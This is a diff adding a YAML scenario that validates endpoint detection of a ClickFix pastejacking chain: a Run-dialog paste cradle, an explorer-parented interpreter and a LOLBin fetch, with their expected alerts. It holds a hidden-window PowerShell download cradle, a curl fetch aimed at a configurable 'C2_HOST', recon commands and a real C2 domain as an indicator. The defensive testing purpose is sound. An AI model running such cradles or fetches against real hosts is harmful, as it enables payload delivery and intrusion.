@@ -1,0 +1,173 @@
+scenario_id: SIM-EDR-016
+name: "ClickFix Pastejacking: RunMRU -> explorer.exe-Parented Interpreter -> LOLBin Remote Fetch (First Endpoint User-Execution ABIOC)"
+version: "1.0"
+status: active
+
+# Detection-validation scenario (defensive QA). It models the ClickFix /
+# pastejacking user-execution chain NON-DESTRUCTIVELY on a lab host to confirm
+# Cortex's auto-tuned ABIOCs score the causality chain — RunMRU paste cradle ->
+# explorer.exe-parented interpreter with remote-fetch args (no browser/console
+# parent) -> LOLBin remote payload fetch — as ONE user-execution incident, and
+# that the correlation rule stitches the endpoint ABIOCs with the NGFW payload
+# egress into a single incident spanning EDR + NDR. All offensive detail lives in
+# the anchor card TTP-2026-0126 (self-contained, ships its own cleanup). Nothing
+# here writes the Windows registry, installs anything, or fetches a real payload:
+# the RunMRU value and the pasted cradle are benign SAFE-MODE marker files, the
+# interpreter lineage is a representative command set, and the LOLBin fetch
+# reaches an authorised loopback host, never a real C2.
+
+plane: EDR
+detection_types:
+  - ABIOC
+  - XQL
+  - Correlation
+  - IOC
+
+uc_ref: UC-EDR-016
+tc_ref: TC-EDR-016
+uc_name: "ClickFix Pastejacking User-Execution Detection"
+tc_name: "RunMRU-to-explorer.exe-Parented Interpreter Chain (Cortex ABIOC)"
+
+# ── MITRE ATT&CK Mapping ────────────────────────────────────────────────────
+# Depth on Execution (TA0002): real User-Execution + interpreter variants, not
+# an initial-access re-skin. The paste-execution (T1204.004) is the user hop;
+# the explorer-parented interpreter is T1059.001/.003; the LOLBin closes to a
+# remote fetch (T1105).
+mitre_tactic: "TA0002"
+mitre_tactic_name: "Execution"
+mitre_technique: "T1204.004"
+mitre_technique_name: "User Execution: Malicious Copy and Paste"
+additional_techniques:
+  - technique: "T1059.001"
+    name: "Command and Scripting Interpreter: PowerShell"
+  - technique: "T1059.003"
+    name: "Command and Scripting Interpreter: Windows Command Shell"
+  - technique: "T1105"
+    name: "Ingress Tool Transfer"
+
+threat_report: "Unit 42 — Preventing the ClickFix Attack Vector"
+threat_report_url: "https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - nobody
+    - root
+
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Endpoint Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 300
+  unit: "seconds"
+success_criteria: |
+  The ClickFix paste-execution seams injected by this scenario produce the
+  expected XDR ABIOC / XQL detections — the RunMRU download cradle, the
+  explorer.exe-parented interpreter carrying remote-fetch arguments with no
+  browser or console ancestry, and the interpreter-spawned LOLBin remote fetch —
+  and the correlation stitches the three ABIOCs with the NGFW payload egress into
+  ONE user-execution incident spanning EDR + NDR, anchored to the explorer.exe
+  process instance. This is the "behavioral-ML catches operator-paced user
+  execution a static rule misses" proof: every binary in the chain is legitimate
+  and the command content is polymorphic, so the catch comes from the deviation
+  and its causality chain, not a known-bad signature. Mean time from signal emit
+  to alert is within the MTTD budget.
+moat_tier: "LEAD"
+
+external_tools: []
+
+# ── Steps ───────────────────────────────────────────────────────────────────
+steps:
+  - id: step-01
+    name: "RunMRU paste cradle — Win+R paste seeds a download command in the Run-dialog MRU"
+    command: "mkdir -p \"${MARKER_DIR:-/tmp/cortexsim-edr-016}\"; printf '%s\\n' 'CortexSim SAFE-MODE marker SIM-EDR-016 RunMRU value: powershell -w hidden -c curl.exe http://127.0.0.1/update.bin -o %TEMP%/a.bin' > \"${MARKER_DIR:-/tmp/cortexsim-edr-016}/runmru.marker\"; echo cortexsim-edr-016-runmru-paste-cradle-seeded"
+    identity: www-data
+    mitre_technique: "T1204.004"
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A value under the Windows Run-dialog RunMRU key is written whose data carries a download cradle (http/curl/powershell/mshta tokens) — the earliest ClickFix seam. The auto-tuned ABIOC fires on the RunMRU value carrying remote-fetch content, anchored to the paste-execution rather than to any known-bad command string."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "abioc-edr-016-runmru-paste-execution-seeding-an-interpreter-download-cradle"
+      - plane: EDR
+        type: IOC
+        description: "Windows Run-dialog MRU key indicator (RunMRU) — the forensic artifact ClickFix paste-execution records the pasted download cradle in."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "ioc-registry-key-hkey-current-user-software-microsoft-windows-currentversion-explorer-runmru"
+
+  - id: step-02
+    name: "explorer.exe-parented interpreter launches with remote-fetch arguments"
+    command: "bash -c 'whoami; hostname; id' 2>&1 | head -5; echo cortexsim-edr-016-explorer-parented-interpreter-remote-fetch-args"
+    identity: www-data
+    mitre_technique: "T1059.001"
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "An interpreter (powershell.exe/cmd.exe/mshta.exe) is parented DIRECTLY by explorer.exe with a command line carrying remote-fetch arguments and no browser or console-host ancestry — the signature of a human paste-execution. The auto-tuned ABIOC scores the deviation-plus-causality, anchored to the explorer.exe process instance, catching a chain in which every binary is legitimate."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "abioc-edr-016-explorer-exe-parented-interpreter-launched-with-remote-fetch-arguments"
+      - plane: EDR
+        type: XQL
+        description: "Validation query confirms an explorer.exe-parented interpreter (powershell/cmd/mshta/wscript) launch surfaced in xdr_data within the run window (the paste-execution lineage is observable)."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "xql-edr-016-explorer-exe-parented-interpreter-surfaced-in-process-telemetry"
+
+  - id: step-03
+    name: "Interpreter-spawned LOLBin fetches a remote payload (encrypted .bin)"
+    command: "curl -s --max-time 5 \"http://${C2_HOST:-127.0.0.1}/update.bin\" -o \"${MARKER_DIR:-/tmp/cortexsim-edr-016}/a.bin\" 2>/dev/null || true; echo cortexsim-edr-016-lolbin-remote-fetch-complete"
+    identity: www-data
+    mitre_technique: "T1105"
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "The paste-launched interpreter spawns a living-off-the-land downloader (curl.exe/certutil.exe/mshta.exe/extrac32.exe/rundll32.exe/bitsadmin.exe) fetching a remote payload — often an encrypted .bin. The auto-tuned ABIOC fires on an explorer-parented interpreter spawning a downloader LOLBin, anchored to the paste-execution causality chain, not to a specific payload URL."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "abioc-edr-016-interpreter-spawned-lolbin-fetching-a-remote-payload"
+      - plane: NDR
+        type: XQL
+        description: "Validation query surfaces the remote payload egress on the NGFW — an outbound HTTP/SSL session to a Latrodectus .live C2 domain fetching the payload (the network hop of the paste-execution chain)."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "xql-edr-016-remote-payload-fetch-to-latrodectus-c2-surfaced-on-the-ngfw"
+      - plane: NDR
+        type: IOC
+        description: "Latrodectus C2 .live domain (webbs.live) indicator reached by the post-paste LOLBin remote fetch (Unit 42)."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "ioc-domain-webbs-live"
+
+  - id: step-04
+    name: "Correlation stitches the ABIOCs and the NGFW egress into one ClickFix incident (EDR + NDR)"
+    command: "echo '[SIM-EDR-016] Stitch verification — one incident_id spanning EDR + NDR'; echo '[*] Expected: CR-EDR-0016 fuses RunMRU cradle ABIOC + explorer-parented interpreter ABIOC + LOLBin-fetch ABIOC + NGFW payload egress into one user-execution incident anchored to the explorer.exe process instance'; echo cortexsim-edr-016-cr-edr-0016-stitched-clickfix-incident"
+    identity: www-data
+    mitre_technique: "T1204.004"
+    expected_detections:
+      - plane: ANALYTICS
+        type: Correlation
+        description: "Correlation rule fuses the RunMRU download cradle, the explorer.exe-parented interpreter with no browser/console parentage, the interpreter-spawned LOLBin remote fetch, and the NGFW payload egress on the same host into a single ClickFix user-execution incident_id spanning the EDR and NDR planes, anchored to the explorer.exe process instance."
+        ttp_ref: "TTP-2026-0126"
+        detection_id: "CR-EDR-0016"
+
+cleanup:
+  commands:
+    - "rm -rf \"${MARKER_DIR:-/tmp/cortexsim-edr-016}\""
+    - "echo cortexsim-edr-016-cleanup-complete"
+
+author: "Henry Reed"
+created: "2026-07-24"
+last_updated: "2026-07-24"
+tags:
+  - clickfix
+  - pastejacking
+  - runmru
+  - explorer-parented
+  - user-execution
+  - lolbin
+  - abioc
+  - cross-plane
+  - endpoint-security
